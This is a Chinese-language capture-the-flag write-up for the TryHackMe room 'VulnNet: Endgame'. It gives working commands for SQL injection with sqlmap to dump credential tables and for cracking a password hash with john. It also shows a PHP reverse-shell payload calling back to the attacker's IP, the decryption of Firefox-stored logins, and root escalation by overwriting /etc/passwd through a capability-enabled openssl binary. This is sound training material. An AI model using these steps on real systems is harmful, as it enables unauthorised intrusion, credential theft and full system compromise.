# VulnNet: Endgame

入侵这个模拟的易受攻击的基础设施。没有谜题。枚举是关键。

VulnNet系列带着新的挑战回来了。

这是本系列的最后一个挑战，妥协系统。枚举是关键。

---

## 端口扫描

循例 nmap扫：

    22/tcp open  ssh
    80/tcp open  http

## 信息收集

访问web看看：

    Our services are accessible only through the vulnnet.thm domain! 

将vulnnet.thm添加到etc/hosts，再通过域名访问

平平无奇的页面，没有发现什么线索，gobuster:

    /README.txt

也没有有用的信息

## 子域扫描

再尝试子域扫描，这里使用的是我自己写的小脚本：

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">python3</font> <u style="text-decoration-style:single">./M1n9K1n9_Python_tools/SubDomain_Scanner.py</u> vulnnet.thm <u style="text-decoration-style:single">/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt</u> 2 32
Input Fuck length (split &quot;,&quot;):65,301
 ____                    _          _    
/ ___| _   _  __ _  ___ | |__   ___| |_  
\___ \| | | |/ _` |/ _ \| &apos;_ \ / _ \ __| 
 ___) | |_| | (_| | (_) | |_) |  __/ |_  
|____/ \__,_|\__, |\___/|_.__/ \___|\__| 
             |___/                       

Length:19316 :Valid domain:blog.vulnnet.thm
Length:26701 :Valid domain:shop.vulnnet.thm
Length:18 :Valid domain:api.vulnnet.thm
Length:0 :Valid domain:admin1.vulnnet.thm
Done!</pre>

脚本链接：[M1n9K1n9_SubDomain_Scanner.py](https://github.com/Sugobet/M1n9K1n9_CyberSecurity_log/blob/master/TryHackMe/My_Python_Scripts/SubDomain_Scanner.py)

可以看到结果：

    Length:19316 :Valid domain:blog.vulnnet.thm
    Length:26701 :Valid domain:shop.vulnnet.thm
    Length:18 :Valid domain:api.vulnnet.thm
    Length:0 :Valid domain:admin1.vulnnet.thm

我们将这些子域添加到/etc/hosts

## 子域信息收集

子域的信息收集：

    shop -> 空空的兔子洞
    blog -> 看起来也没什么东西，除了一些用户名
    api -> 空

admin1:

    vulnnet management panel is up! 

## 目录扫描

我们使用gobuster扫一下目录：

    /en                   (Status: 301) [Size: 321] [--> http://admin1.vulnnet.thm/en/]
    /fileadmin            (Status: 301) [Size: 328] [--> http://admin1.vulnnet.thm/fileadmin/]
    /server-status        (Status: 403) [Size: 283]
    /typo3                (Status: 301) [Size: 324] [--> http://admin1.vulnnet.thm/typo3/]
    /typo3conf            (Status: 301) [Size: 328] [--> http://admin1.vulnnet.thm/typo3conf/]
    /typo3temp            (Status: 301) [Size: 328] [--> http://admin1.vulnnet.thm/typo3temp/]
    /vendor               (Status: 301) [Size: 325] [--> http://admin1.vulnnet.thm/vendor/]

## 信息收集

发现typo3，但是在这些目录搜寻，都没有暴露相关的版本号

为了节省点时间，看了眼wp。

## SQLI

奥！我们忽略了一个东西，我们在blog查看任意一篇文章的时候调用了一个api，而这个存在sql注入，验证：

    http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1 or sleep(3);--

我们借助sqlmap为我们快速获取所需的数据

sqlmap给出三个数据库：

    [*] blog
    [*] information_schema
    [*] vn_admin

查看vn_admin

    sqlmap -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -p blog --dbms=mysql  -D vn_admin --tables

有两个表值得我们注意：

    be_users
    fe_users

导出be_users数据：

    sqlmap -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -p blog --dbms=mysql  -D vn_admin -T be_users -C username,password,admin --dump

.

    username,password,admin
    chris_w,"$argon2i$v=19$m=65536,t=16,p=2$UnlVSE***********YufyM4Rg",1

可以看到该用户是admin，并且还有它的密码hash

john在后台爆，我们顺便查看其他表

fe_users表是空的

## 凭据转储

终于，在blog库下的users表下存在许多明文的用户名和密码，我们可以尝试使用这些密码来尝试爆破刚刚的密码hash，因为john直到现在还没爆出来

sqlmap -u 'http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1' -p blog --dbms=mysql  -D blog -T users -C username,password --dump

文件保存在：

    /root/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv

清洗数据并保存：

    cut -d "," -f2 /root/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv > ./test1.txt

## John爆破

使用该字典进行john爆破：

    john --wordlist=./test1.txt ./hash

很快得到密码：

    vAx*****eTz

使用这对凭据尝试登录http://admin1.vulnnet.thm/typo3/

成功

## 任意文件上传

在后台尝试文件上传，有防护，尝试绕过，但是失败。

在查看其他功能的时候，好玩了，在Settings中的“Configure Installation-Wide Options”可以修改文件禁用列表

那就好办了，直接将原有的禁用列表全部删个干净

然后回到Pages -> 添加新页，类型选择file links

上传php reverse shell:

    <?php
    $sock=fsockopen("10.14.39.48",8888);$proc=proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
    ?>

从fileList中可以看到，我们的文件上传到了user_upload文件夹。

## 还记得你刚刚做过的事情吗？ - Reverse shell

还记得刚刚扫描admin1的结果吗，里面有一个fileadmin目录，user_upload就在这里。

虽然我们直接访问/fileadmin/user_upload/没有任何返回。

但是我们知道文件名，不妨直接访问文件试试。

先开启nc监听：

    nc -vlnp 8888

访问：

    http://admin1.vulnnet.thm/fileadmin/user_upload/rev_she11.php/

成功getshell

## 升级shell

    python3 -c "import pty;pty.spawn('/bin/bash')"  

## 火狐浏览器凭据解密

进入/home/system

没权限读user.txt

发现./.mozilla文件夹，

    ls -la ./2fjnrwth.default-release 

里面包含了logins.json等等之类的文件。

我们下载它，首先压缩zip并打开http server：

    zip -r /tmp/data.zip ./2fjnrwth.default-release

    www-data@vulnnet-endgame:/tmp$ python3 -m http.server 8888

攻击机：

    wget http://10.10.70.55:8888/data.zip

将其解压，并使用firefox_decrypt.py进行获取凭据：

    python3 ./linux-tools_and_exp/firefox_decrypt.py ./2fjnrwth.default-release

成功获得

    Website:   https://tryhackme.com
    Username: 'chris_w@vulnnet.thm'
    Password: '8y7TK*******BYhwsb'

## 横向移动

尝试使用这一个密码登录system：

    ssh system@10.10.70.55

    system@vulnnet-endgame:~$ cat ./user.txt

成功登录

## openssl任意文件读写

枚举：

    system@vulnnet-endgame:~$ getcap -r / 2>/dev/null
    /home/system/Utils/openssl =ep

尝试openssl任意文件读写：

    system@vulnnet-endgame:~$ echo "hack" | /home/system/Utils/openssl enc -out /etc/passwd

<pre><font color="#47D4B9"><b>system@vulnnet-endgame</b></font>:<font color="#277FFF"><b>~</b></font>$ cat /etc/passwd
hack
</pre>

成功

我们可以添加root权限的账户进去并登录

首先使用openssl passwd生成密码hash

    openssl passwd -1 -salt hack 1q2w3e4r
    $1$hack$eu7wA.3faDMt9Z2srODT9/

组装：

    sugo:$1$hack$eu7wA.3faDMt9Z2srODT9/:0:0:root:/root:/bin/bash

备份passwd并写入，使用openssl串改/etc/passwd内容为备份的passwd

<pre><font color="#47D4B9"><b>system@vulnnet-endgame</b></font>:<font color="#277FFF"><b>~</b></font>$ cp /etc/passwd /tmp/passwd.bak
<font color="#47D4B9"><b>system@vulnnet-endgame</b></font>:<font color="#277FFF"><b>~</b></font>$ echo &apos;sugo:$1$hack$eu7wA.3faDMt9Z2srODT9/:0:0:root:/root:/bin/bash&apos; &gt;&gt; /tmp/passwd.bak 
<font color="#47D4B9"><b>system@vulnnet-endgame</b></font>:<font color="#277FFF"><b>~</b></font>$ cat /tmp/passwd.bak | /home/system/Utils/openssl enc -out /etc/passwd</pre>

<pre><font color="#47D4B9"><b>system@vulnnet-endgame</b></font>:<font color="#277FFF"><b>~</b></font>$ su sugo
Password: 
root@vulnnet-endgame:/home/system# 
</pre>

成功getroot

<pre>root@vulnnet-endgame:/home/system# cat /root/root.txt
cat: /root/root.txt: No such file or directory
root@vulnnet-endgame:/home/system# ls -la /root
total 36
drwx------  7 root root 4096 Jun 15  2022 <font color="#277FFF"><b>.</b></font>
drwxr-xr-x 24 root root 4096 Jun 15  2022 <font color="#277FFF"><b>..</b></font>
lrwxrwxrwx  1 root root    9 Jun 14  2022 <font color="#05A1F7"><b>.bash_history</b></font> -&gt; <span style="background-color:#1F2229"><font color="#FF8A18"><b>/dev/null</b></font></span>
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Sep 15  2021 <font color="#277FFF"><b>.cache</b></font>
drwx------  3 root root 4096 Jun 14  2022 <font color="#277FFF"><b>.gnupg</b></font>
drwxr-xr-x  3 root root 4096 Jun 14  2022 <font color="#277FFF"><b>.local</b></font>
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  6 root root 4096 Jun 14  2022 <font color="#277FFF"><b>snap</b></font>
drw-------  2 root root 4096 Jun 15  2022 <font color="#277FFF"><b>thm-flag</b></font>
root@vulnnet-endgame:/home/system# cd /root/thm-flag
root@vulnnet-endgame:~/thm-flag# ls -la
total 12
drw------- 2 root root 4096 Jun 15  2022 <font color="#277FFF"><b>.</b></font>
drwx------ 7 root root 4096 Jun 15  2022 <font color="#277FFF"><b>..</b></font>
-rw------- 1 root root   38 Jun 15  2022 root.txt
root@vulnnet-endgame:~/thm-flag# cat ./root.txt</pre>
